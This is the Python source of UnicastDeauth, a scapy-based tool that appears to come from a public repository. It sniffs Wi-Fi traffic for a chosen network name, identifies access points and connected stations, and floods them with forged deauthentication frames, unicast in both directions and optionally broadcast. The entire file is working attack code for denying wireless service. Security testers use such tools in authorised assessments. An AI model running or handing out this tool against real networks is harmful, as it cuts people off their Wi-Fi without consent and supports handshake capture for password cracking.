#!/usr/bin/env python3

# UnicastDeauth is a simple Python 3 script that automates unicast Wi-Fi deauthentication attacks
# author - mamatb (t.me/m_amatb)
# location - https://github.com/mamatb/UnicastDeauth
# style guide - https://google.github.io/styleguide/pyguide.html

# TODO
#
# offer targeting bssids instead of an essid
# add module docstring
# check for protected management frames

import argparse
import multiprocessing
from re import compile as re_compile
from scapy import sendrecv
from scapy.layers import dot11
import sys

BROADCAST = 'ff:ff:ff:ff:ff:ff'
DEAUTH_COUNT = 64

class MsgException(Exception):
    def __init__(self, exception, message = 'Unknown error', *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.exception = exception
        self.message = message
    
    def __str__(self):
        return f'[!] Error! {self.message}:\n    {self.exception}'

class AccessPoints:
    def __init__(self):
        self.bssids = set()
    
    def __contains__(self, bssid):
        return bssid in self.bssids
    
    def add(self, bssid, essid):
        self.bssids.add(bssid)
        print_info(
            f'AP detected for network {essid}'
            f'\n    access point = {bssid}'
        )

class Stations:
    def __init__(self):
        self.bssids = {} # {bssid_sta: bssid_ap}
    
    def get(self, bssid_sta):
        return self.bssids.get(bssid_sta)
    
    def update(self, bssid_sta, bssid_ap, essid):
        self.bssids.update({bssid_sta: bssid_ap})
        print_info(
            f'STA detected for network {essid}'
            f'\n    station      = {bssid_sta}'
            f'\n    access point = {bssid_ap}'
        )

class AccessPointsWhitelist:
    def __init__(self, bssids_string):
        self.bssids = set()
        self.bssid_regex = re_compile('^([0-9a-f]{2}:){5}[0-9a-f]{2}$')
        for bssid in bssids_string.split(','):
            bssid = bssid.strip().lower()
            if self.bssid_regex.match(bssid):
                self.bssids.add(bssid)
    
    def __contains__(self, bssid):
        return bssid in self.bssids

def panic(msg_exception):
    '''exception handling'''
    
    print(msg_exception, file = sys.stderr)

def print_info(message):
    '''additional info printing'''
    
    print(f'[!] Info: {message}', file = sys.stderr)

def is_unicast(bssid):
    '''bssid type checking'''
    
    try:
        unicast = not (int(bssid.split(':')[0], 16) & 0x1)
    except Exception as e:
        raise MsgException(e, 'BSSID could not be processed')
    return unicast

def get_src_dst_network(frame):
    '''frame control field parsing'''
    
    try:
        to_ds = frame.FCfield & 0x1
        from_ds = frame.FCfield & 0x2
        if to_ds:
            bssid_dst = frame.addr3
            if not from_ds:
                bssid_src = frame.addr2
                bssid_network = frame.addr1
        else:
            bssid_dst = frame.addr1
            if from_ds:
                bssid_src = frame.addr3
                bssid_network = frame.addr2
            else:
                bssid_src = frame.addr2
                bssid_network = frame.addr3
    except Exception as e:
        raise MsgException(e, 'Frame Control field could not be processed')
    return bssid_src, bssid_dst, bssid_network

def unicast_deauth(wifi_interface, deauth_rounds, bssid_sta, bssid_ap, bssid_network):
    '''unicast deauthentication'''
    
    try:
        def unicast_deauth_parallel():
            sys.stderr = sys.stdout = None
            for i in range(deauth_rounds):
                sendrecv.sendp(
                    dot11.RadioTap() /
                    dot11.Dot11(addr1 = bssid_sta, addr2 = bssid_ap, addr3 = bssid_network) /
                    dot11.Dot11Deauth(reason = 7),
                    iface = wifi_interface,
                    count = DEAUTH_COUNT,
                    verbose = False,
                )
                sendrecv.sendp(
                    dot11.RadioTap() /
                    dot11.Dot11(addr1 = bssid_ap, addr2 = bssid_sta, addr3 = bssid_network) /
                    dot11.Dot11Deauth(reason = 7),
                    iface = wifi_interface,
                    count = DEAUTH_COUNT,
                    verbose = False,
                )
        multiprocessing.Process(target = unicast_deauth_parallel).start()
        print_info(f'sending {deauth_rounds} x {DEAUTH_COUNT} deauthentication frames from AP {bssid_ap} to STA {bssid_sta} ...')
        print_info(f'sending {deauth_rounds} x {DEAUTH_COUNT} deauthentication frames from STA {bssid_sta} to AP {bssid_ap} ...')
    except Exception as e:
        raise MsgException(e, 'Unicast deauthentication frames could not be sent')

def broadcast_deauth(wifi_interface, deauth_rounds, bssid_ap, bssid_network):
    '''broadcast deauthentication'''
    
    try:
        def broadcast_deauth_parallel():
            sys.stderr = sys.stdout = None
            for i in range(deauth_rounds):
                sendrecv.sendp(
                    dot11.RadioTap() /
                    dot11.Dot11(addr1 = BROADCAST, addr2 = bssid_ap, addr3 = bssid_network) /
                    dot11.Dot11Deauth(reason = 7),
                    iface = wifi_interface,
                    count = DEAUTH_COUNT,
                    verbose = False,
                )
        multiprocessing.Process(target = broadcast_deauth_parallel).start()
        print_info(f'sending {deauth_rounds} x {DEAUTH_COUNT} broadcast deauthentication frames from AP {bssid_ap} ...')
    except Exception as e:
        raise MsgException(e, 'Broadcast deauthentication frames could not be sent')

def sniffer_wrapper(wifi_interface, essid, broadcast_enabled, deauth_rounds, aps_whitelist, access_points, stations):
    def sniffer_handler(frame):
        '''sniffed frame processing'''
        
        try:
            bssid_src, bssid_dst, bssid_network = get_src_dst_network(frame)
            if bssid_src and bssid_dst and bssid_network:
                
                # wlan type mgt subtype beacon or wlan type mgt subtype probe-resp
                if frame.haslayer(dot11.Dot11Beacon) or frame.haslayer(dot11.Dot11ProbeResp):
                    if (bssid_src not in aps_whitelist) and (bssid_src not in access_points):
                        dot11_element = frame.getlayer(dot11.Dot11Elt)
                        while dot11_element:
                            if dot11_element.ID == 0:
                                if dot11_element.info and (dot11_element.info == bytes(essid, 'utf-8')):
                                    access_points.add(bssid_src, essid)
                                    if broadcast_enabled:
                                        broadcast_deauth(wifi_interface, deauth_rounds, bssid_src, bssid_network)
                                break
                            dot11_element = dot11_element.payload.getlayer(dot11.Dot11Elt)
                
                # wlan type mgt subtype probe-req
                elif frame.haslayer(dot11.Dot11ProbeReq):
                    if (bssid_dst not in aps_whitelist) and is_unicast(bssid_dst) and (bssid_dst not in access_points):
                        dot11_element = frame.getlayer(dot11.Dot11Elt)
                        while dot11_element:
                            if dot11_element.ID == 0:
                                if dot11_element.info and (dot11_element.info == bytes(essid, 'utf-8')):
                                    access_points.add(bssid_dst, essid)
                                    if broadcast_enabled:
                                        broadcast_deauth(wifi_interface, deauth_rounds, bssid_dst, bssid_network)
                                break
                            dot11_element = dot11_element.payload.getlayer(dot11.Dot11Elt)
                
                # wlan type ctl or wlan type data: from ap to sta, from sta to ap
                else:
                    if (bssid_src in access_points) and (stations.get(bssid_dst) != bssid_src) and is_unicast(bssid_dst):
                        stations.update(bssid_dst, bssid_src, essid)
                        unicast_deauth(wifi_interface, deauth_rounds, bssid_dst, bssid_src, bssid_network)
                    elif (bssid_dst in access_points) and (stations.get(bssid_src) != bssid_dst):
                        stations.update(bssid_src, bssid_dst, essid)
                        unicast_deauth(wifi_interface, deauth_rounds, bssid_src, bssid_dst, bssid_network)
        
        except Exception as e:
            raise MsgException(e, 'Sniffed frames could not be processed')
    return sniffer_handler

def main():
    '''main'''
    
    try:
        examples = [
            'UnicastDeauth.py -i wlan0 -e target -b',
            'UnicastDeauth.py -i wlan0 -e target -n 8',
            'UnicastDeauth.py -i wlan0 -e target -wl 00:11:22:33:44:00,00:11:22:33:44:55',
        ]
        parser = argparse.ArgumentParser(
            description = 'UnicastDeauth is a simple Python 3 script that automates unicast Wi-Fi deauthentication attacks',
            formatter_class = argparse.RawTextHelpFormatter,
            epilog = 'examples:\n  ' + '\n  '.join(examples),
        )
        parser.add_argument(
            '-i',
            dest = 'wifi_interface',
            help = 'attacker Wi-Fi interface',
            required = True,
        )
        parser.add_argument(
            '-e',
            dest = 'essid',
            help = 'target ESSID',
            required = True,
        )
        parser.add_argument(
            '-b',
            dest = 'broadcast_enabled',
            help = 'enable broadcast deauthentication',
            required = False,
            action = 'store_true',
        )
        parser.add_argument(
            '-n',
            dest = 'deauth_rounds',
            help = 'number of deauthentication rounds',
            required = False,
            type = int,
            default = 1,
        )
        parser.add_argument(
            '-wl',
            dest = 'aps_whitelist',
            help = 'comma-separated APs whitelist',
            required = False,
            type = AccessPointsWhitelist,
            default = [],
        )
        args = parser.parse_args()
        filters = [
            'wlan type mgt subtype beacon',
            'wlan type mgt subtype probe-req',
            'wlan type mgt subtype probe-resp',
            'wlan type ctl',
            'wlan type data',
        ]
        access_points = AccessPoints()
        stations = Stations()
        sendrecv.sniff(
            iface = args.wifi_interface,
            filter = ' or '.join(filters),
            prn = sniffer_wrapper(
                args.wifi_interface,
                args.essid,
                args.broadcast_enabled,
                args.deauth_rounds,
                args.aps_whitelist,
                access_points,
                stations,
            ),
        )
    except MsgException as msg_exception:
        panic(msg_exception)
    except Exception as e:
        panic(MsgException(e))
    finally:
        try:
            for child in multiprocessing.active_children():
                child.terminate()
        except:
            sys.exit(-1)

if __name__ == '__main__':
    main()
